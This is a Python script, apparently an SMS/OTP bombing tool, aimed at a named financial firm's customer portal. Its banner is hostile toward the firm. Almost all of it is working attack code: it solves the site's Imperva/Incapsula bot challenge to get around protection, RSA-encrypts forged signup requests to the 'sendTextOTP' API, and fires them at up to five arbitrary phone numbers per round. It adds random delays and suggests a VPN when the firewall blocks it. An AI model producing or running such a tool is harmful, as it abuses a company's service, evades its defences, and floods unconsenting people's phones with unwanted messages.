#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Century Financial - OTP Sender
Colorful & Mobile-Friendly Version
"""

import json
import base64
import requests
import rsa
import re
import time
import random
from datetime import datetime

# ANSI Color Codes (Mobile-friendly)
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    
    # Emojis
    ROCKET = '🚀'
    CHECK = '✓'
    CROSS = '✗'
    PHONE = '📱'
    WORLD = '🌍'
    KEY = '🔑'
    FIRE = '🔥'
    PARTY = '🎉'
    WARNING = '⚠️'

# Country Codes Database
COUNTRIES = {
    'pakistan': {'code': '+92', 'length': 10, 'emoji': '🇵🇰'},
    'angola': {'code': '+244', 'length': 9, 'emoji': '🇦🇴'},
    'cambodia': {'code': '+855', 'length': 8, 'emoji': '🇰🇭'},
    'armenia': {'code': '+374', 'length': 8, 'emoji': '🇦🇲'},
    'tajikistan': {'code': '+992', 'length': 9, 'emoji': '🇹🇯'},
    'kyrgyzstan': {'code': '+996', 'length': 9, 'emoji': '🇰🇬'},
    'kosovo': {'code': '+383', 'length': 8, 'emoji': '🇽🇰'},
    'malaysia': {'code': '+60', 'length': 9, 'emoji': '🇲🇾'},
    'myanmar': {'code': '+95', 'length': 9, 'emoji': '🇲🇲'},
    'tanzania': {'code': '+255', 'length': 9, 'emoji': '🇹🇿'}
}

# RSA Public Key
PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIICITANBgkqhkiG9w0BAQEFAAOCAg4AMIICCQKCAgBvwSFgwESMPwF0K1HrqoPi
Qk8sRnanldiqrWiumUbNLVPAToaws6uirOnOzdsHFInqii2EBeod2H+QTFrfNOkJ
zQGx8139684tgV1wjj/CErzDYgTjp0g4NbXRo8q7qX6QSsm2vOuqWgTjf51xT7Fa
tM/NAkkwSVpiAGmjMLpveHcVTCtuiEwVUaqipOCLyokPkDXOup2jM7bGwu+VOA2g
jLHX35dwJN3mMtW2zLR9ZPRnGzpyyhj3hRoyCebw+fD9qm3e5UTc42YDvjDoLpcP
9LW+b0Recbc1qBQS3lt/26hy5KPcjCUEFv4S9SD9n0Knducno5rDL5eiOvahb3gr
G4iBdV/bXtG3ZW5Qhvh4hhZ5w5p8Aw0/m3O6Nkp/Wj1q+viusFq37IGaATO25vUF
z8PhESx79PlAFysxmv2ZZrmjtLhL/w0rt7v7q4H+R58hJI1uQbHMH+/71PxlgTxA
CGzIzZZw5tEEATDL33GqqAq4ernnPCbOZOQE5KcrGAqyaOLkLSqzElKGDIp7095k
g09LZFj3MkrmL03npCkArJocaCcXXE2GJZVp1NKPbgG8QrDQ7RmXjGIRIGs+SeS+
zLbMd3Q2Wo4mVQ2beEPwxBfDIaNSvv+UkoVH630Wej+sOZ8zsJmcjUB3qvpZZAiu
dW8Z0Ps1T+f8cGJoM7YnAwIDAQAB
-----END PUBLIC KEY-----"""

pub_key = rsa.PublicKey.load_pkcs1_openssl_pem(PUBLIC_KEY_PEM.encode())

def print_banner():
    """Display colorful banner"""
    print(f"\n{Colors.CYAN}{'='*55}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}    {Colors.FIRE} FARMAN ALI - CENTRY FU*KER {Colors.FIRE}{Colors.END}")
    print(f"{Colors.CYAN}{'='*55}{Colors.END}\n")

def print_success(msg):
    """Print success message"""
    print(f"{Colors.GREEN}{Colors.CHECK} {msg}{Colors.END}")

def print_error(msg):
    """Print error message"""
    print(f"{Colors.RED}{Colors.CROSS} {msg}{Colors.END}")

def print_info(msg):
    """Print info message"""
    print(f"{Colors.CYAN}{Colors.ROCKET} {msg}{Colors.END}")

def print_warning(msg):
    """Print warning message"""
    print(f"{Colors.YELLOW}{Colors.WARNING} {msg}{Colors.END}")

def show_countries():
    """Display available countries"""
    print(f"\n{Colors.BOLD}{Colors.WORLD} Available Countries:{Colors.END}\n")
    for i, (name, info) in enumerate(COUNTRIES.items(), 1):
        print(f"  {Colors.CYAN}{i:2d}.{Colors.END} {info['emoji']} {Colors.BOLD}{name.title()}{Colors.END} ({info['code']})")
    print()

def parse_phone_number(full_number):
    """
    Parse full phone number and extract country code + number
    Examples:
        +923103219085 -> (+92, 3103219085)
        923103219085 -> (+92, 3103219085)
        03103219085 -> (None, 03103219085)
    """
    # Remove spaces, dashes, parentheses
    clean = re.sub(r'[\s\-\(\)]', '', full_number)
    
    # Check if starts with +
    if clean.startswith('+'):
        clean = clean[1:]
    
    # Try to match against known country codes
    for country_info in COUNTRIES.values():
        code = country_info['code'][1:]  # Remove + from stored code
        if clean.startswith(code):
            number = clean[len(code):]
            return (country_info['code'], number)
    
    # No country code found
    return (None, clean)

def select_country():
    """Let user select country"""
    show_countries()
    
    while True:
        try:
            choice = input(f"{Colors.BLUE}{Colors.PHONE} Select country (1-{len(COUNTRIES)}): {Colors.END}").strip()
            idx = int(choice) - 1
            
            if 0 <= idx < len(COUNTRIES):
                country_name = list(COUNTRIES.keys())[idx]
                return country_name, COUNTRIES[country_name]
            else:
                print_error(f"Invalid choice! Enter 1-{len(COUNTRIES)}")
        except ValueError:
            print_error("Please enter a number!")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Cancelled by user{Colors.END}")
            exit(0)

def get_phone_input():
    """Get phone number with smart parsing"""
    print(f"\n{Colors.BOLD}{Colors.PHONE} Phone Number Input{Colors.END}")
    print(f"{Colors.YELLOW}You can enter:{Colors.END}")
    print(f"  • Full international: {Colors.CYAN}+95912345678{Colors.END}")
    print(f"  • Without +: {Colors.CYAN}60123456789{Colors.END}")
    print(f"  • Local format: {Colors.CYAN}912345678{Colors.END}\n")
    
    full_number = input(f"{Colors.BLUE}Enter phone number: {Colors.END}").strip()
    
    if not full_number:
        print_error("Phone number cannot be empty!")
        return None, None, None
    
    # Try to parse
    country_code, phone_number = parse_phone_number(full_number)
    
    if country_code:
        # Found country code in number
        print_success(f"Detected: {country_code} {phone_number}")
        return country_code, phone_number, None
    else:
        # No country code, ask user to select
        print_warning("Country code not detected. Please select:")
        country_name, country_info = select_country()
        return country_info['code'], phone_number, country_name

def get_multiple_phone_numbers():
    """Get multiple phone numbers (up to 5)"""
    print(f"\n{Colors.BOLD}{Colors.PHONE} Multiple Phone Numbers Input{Colors.END}")
    print(f"{Colors.YELLOW}Enter up to 5 phone numbers (one per line){Colors.END}")
    print(f"{Colors.YELLOW}Press Enter twice when done{Colors.END}\n")
    
    phone_list = []
    count = 0
    
    while count < 5:
        try:
            number = input(f"{Colors.BLUE}Number {count + 1} (or press Enter to finish): {Colors.END}").strip()
            
            if not number:
                if count > 0:
                    break
                else:
                    print_warning("Enter at least one number!")
                    continue
            
            # Parse the number
            country_code, phone_number = parse_phone_number(number)
            
            if country_code:
                print_success(f"Added: {country_code} {phone_number}")
                phone_list.append((country_code, phone_number, None))
                count += 1
            else:
                print_warning("Country code not detected. Please select:")
                country_name, country_info = select_country()
                phone_list.append((country_info['code'], phone_number, country_name))
                print_success(f"Added: {country_info['code']} {phone_number}")
                count += 1
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Cancelled{Colors.END}")
            return []
    
    return phone_list

def setup_session():
    """Initialize session with Imperva bypass"""
    session = requests.Session()
    ua = "Mozilla/5.0 (Linux; Android 14; SM-S911B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.159 Mobile Safari/537.36"
    
    base_headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua-mobile": "?1",
        "Sec-Fetch-Dest": "document"
    }
    
    print_info("Connecting to server...")
    
    try:
        r1 = session.get("https://portal.centuryfinancial.com/signup", 
                        headers=base_headers, timeout=15)
        
        if r1.status_code != 200:
            print_error(f"Server returned status {r1.status_code}")
            return None
        
        print_success(f"Connected ({r1.status_code})")
        
        # Solve Imperva challenge
        match = re.search(r'src="(/_Incapsula_Resource\?[^"]+)"', r1.text)
        if match:
            print_info("Solving security challenge...")
            resource_url = "https://portal.centuryfinancial.com" + match.group(1).replace("&amp;", "&")
            
            resource_headers = base_headers.copy()
            resource_headers["Referer"] = "https://portal.centuryfinancial.com/signup"
            
            r_resource = session.get(resource_url, headers=resource_headers, timeout=15)
            
            if r_resource.status_code == 200:
                print_success("Security passed")
                time.sleep(2)
            else:
                print_warning("Security challenge incomplete")
        
        # Check cookies
        cookie_count = len(session.cookies)
        if cookie_count > 0:
            print_success(f"Session ready ({cookie_count} cookies)")
        else:
            print_warning("No cookies received (may affect request)")
        
        return session
        
    except requests.exceptions.Timeout:
        print_error("Connection timeout!")
        return None
    except Exception as e:
        print_error(f"Setup failed: {str(e)[:50]}")
        return None

def send_otp(session, country_code, phone_number):
    """Send OTP request"""
    
    # Build payload
    raw_data = {
        "url": "sendTextOTP",
        "data": {
            "phoneNumber": phone_number,
            "countryCode": country_code,  # With + prefix
            "isSignUp": True,
            "accountType": "Individual",
            "tradingPlatform": "cfc"
        }
    }
    
    json_str = json.dumps(raw_data, separators=(',', ':'))
    
    print_info("Encrypting payload...")
    
    # RSA Encryption
    chunk_size = 501
    payloads = []
    data_bytes = json_str.encode('utf-8')
    
    try:
        for i in range(0, len(data_bytes), chunk_size):
            chunk = data_bytes[i:i + chunk_size]
            encrypted = rsa.encrypt(chunk, pub_key)
            b64_encrypted = base64.b64encode(encrypted).decode('utf-8')
            payloads.append(b64_encrypted)
        
        print_success(f"Encrypted ({len(payloads)} chunk{'s' if len(payloads) > 1 else ''})")
    except Exception as e:
        print_error(f"Encryption failed: {e}")
        return False
    
    # Prepare request
    ua = "Mozilla/5.0 (Linux; Android 14; SM-S911B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.159 Mobile Safari/537.36"
    
    post_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Authorization": "Bearer null",
        "Origin": "https://portal.centuryfinancial.com",
        "Referer": "https://portal.centuryfinancial.com/signup",
        "User-Agent": ua,
        "sec-ch-ua-mobile": "?1",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty"
    }
    
    api_url = "https://portal.centuryfinancial.com/api/client/graph"
    
    print_info("Sending OTP request...")
    print(f"{Colors.CYAN}→ To: {country_code} {phone_number}{Colors.END}\n")
    
    try:
        r = session.post(
            api_url,
            json={"payloads": payloads},
            headers=post_headers,
            timeout=20
        )
        
        # Response handling
        print(f"{Colors.BOLD}Response:{Colors.END}")
        print(f"{Colors.CYAN}{'─'*55}{Colors.END}")
        
        if r.status_code == 200:
            print(f"{Colors.GREEN}{Colors.BOLD}✓ SUCCESS!{Colors.END} {Colors.PARTY}")
            print(f"{Colors.GREEN}Status: {r.status_code} OK{Colors.END}")
            
            try:
                response_json = r.json()
                print(f"\n{Colors.CYAN}Response Data:{Colors.END}")
                print(json.dumps(response_json, indent=2))
            except:
                print(f"\n{Colors.YELLOW}Response: {r.text[:200]}{Colors.END}")
            
            print(f"\n{Colors.GREEN}{Colors.BOLD}→ OTP should arrive shortly on {country_code} {phone_number}{Colors.END}")
            return True
            
        elif r.status_code == 400:
            print(f"{Colors.RED}✗ FAILED - Bad Request{Colors.END}")
            print(f"Status: {r.status_code}")
            
            try:
                error_data = r.json()
                print(f"\n{Colors.RED}Error:{Colors.END} {error_data}")
            except:
                print(f"\n{Colors.RED}Error:{Colors.END} {r.text[:100]}")
            
            print(f"\n{Colors.YELLOW}Possible reasons:{Colors.END}")
            print(f"  • Invalid phone number format")
            print(f"  • Number already registered")
            print(f"  • Unsupported country/region")
            return False
            
        elif r.status_code == 429:
            print(f"{Colors.RED}✗ RATE LIMITED{Colors.END}")
            print(f"Status: {r.status_code}")
            print(f"\n{Colors.YELLOW}Too many requests. Wait 15-30 minutes and try again.{Colors.END}")
            return False
            
        elif r.status_code == 403:
            print(f"{Colors.RED}✗ BLOCKED{Colors.END}")
            print(f"Status: {r.status_code}")
            print(f"\n{Colors.YELLOW}Request blocked by firewall. Try using VPN.{Colors.END}")
            return False
            
        else:
            print(f"{Colors.RED}✗ FAILED{Colors.END}")
            print(f"Status: {r.status_code}")
            print(f"Response: {r.text[:100]}")
            return False
            
    except requests.exceptions.Timeout:
        print_error("Request timeout! Check your internet connection.")
        return False
    except Exception as e:
        print_error(f"Request failed: {str(e)[:80]}")
        return False
    finally:
        print(f"{Colors.CYAN}{'─'*55}{Colors.END}\n")

def main():
    """Main function"""
    print_banner()
    
    while True:
        # Get phone numbers
        phone_list = get_multiple_phone_numbers()
        
        if not phone_list:
            print_error("No valid numbers entered!")
            retry = input(f"\n{Colors.YELLOW}Try again? (Enter to continue, 'n' to exit): {Colors.END}").strip().lower()
            if retry == 'n':
                break
            continue
        
        # Show summary
        print(f"\n{Colors.BOLD}Summary:{Colors.END}")
        print(f"{Colors.CYAN}{'─'*55}{Colors.END}")
        print(f"  {Colors.BOLD}Total Numbers:{Colors.END} {len(phone_list)}")
        print(f"{Colors.CYAN}{'─'*55}{Colors.END}")
        
        for idx, (country_code, phone_number, country_name) in enumerate(phone_list, 1):
            print(f"\n  {Colors.BOLD}#{idx}{Colors.END}")
            print(f"    {Colors.BOLD}Full Number:{Colors.END}  {country_code}{phone_number}")
            if country_name:
                emoji = COUNTRIES[country_name]['emoji']
                print(f"    {Colors.BOLD}Country:{Colors.END}      {emoji} {country_name.title()}")
        
        print(f"\n{Colors.CYAN}{'─'*55}{Colors.END}\n")
        
        # Auto-proceed (default yes)
        confirm = input(f"{Colors.YELLOW}Proceed? (Y/n): {Colors.END}").strip().lower()
        if confirm == 'n':
            print(f"\n{Colors.YELLOW}Cancelled by user{Colors.END}")
            retry = input(f"\n{Colors.YELLOW}Enter new numbers? (Enter to continue, 'n' to exit): {Colors.END}").strip().lower()
            if retry == 'n':
                break
            continue
        
        print()
        
        # Setup session once
        session = setup_session()
        if not session:
            print_error("Failed to initialize session!")
            retry = input(f"\n{Colors.YELLOW}Try again? (Enter to continue, 'n' to exit): {Colors.END}").strip().lower()
            if retry == 'n':
                break
            continue
        
        print()
        
        # Process each number
        success_count = 0
        fail_count = 0
        
        for idx, (country_code, phone_number, country_name) in enumerate(phone_list, 1):
            print(f"{Colors.BOLD}{Colors.CYAN}Processing #{idx}/{len(phone_list)}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*55}{Colors.END}\n")
            
            success = send_otp(session, country_code, phone_number)
            
            if success:
                success_count += 1
            else:
                fail_count += 1
            
            # Random delay between 1-4 seconds (except for last number)
            if idx < len(phone_list):
                delay = random.randint(1, 4)
                print(f"{Colors.YELLOW}Waiting {delay} seconds before next...{Colors.END}\n")
                time.sleep(delay)
        
        # Final summary
        print(f"\n{Colors.BOLD}{'='*55}{Colors.END}")
        print(f"{Colors.BOLD}Final Results:{Colors.END}")
        print(f"{Colors.GREEN}  ✓ Success: {success_count}{Colors.END}")
        print(f"{Colors.RED}  ✗ Failed:  {fail_count}{Colors.END}")
        print(f"{Colors.BOLD}{'='*55}{Colors.END}\n")
        
        if success_count > 0:
            print(f"{Colors.GREEN}{Colors.BOLD}{Colors.PARTY} Check your phones for OTP! {Colors.PARTY}{Colors.END}\n")
        
        # Ask to run again
        again = input(f"{Colors.YELLOW}Run again with new numbers? (Enter to continue, 'n' to exit): {Colors.END}").strip().lower()
        if again == 'n':
            print(f"\n{Colors.CYAN}Goodbye! {Colors.ROCKET}{Colors.END}\n")
            break
        
        print("\n")  # Extra spacing for next round

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Program interrupted by user{Colors.END}\n")
        exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Fatal error: {e}{Colors.END}\n")
        exit(1)
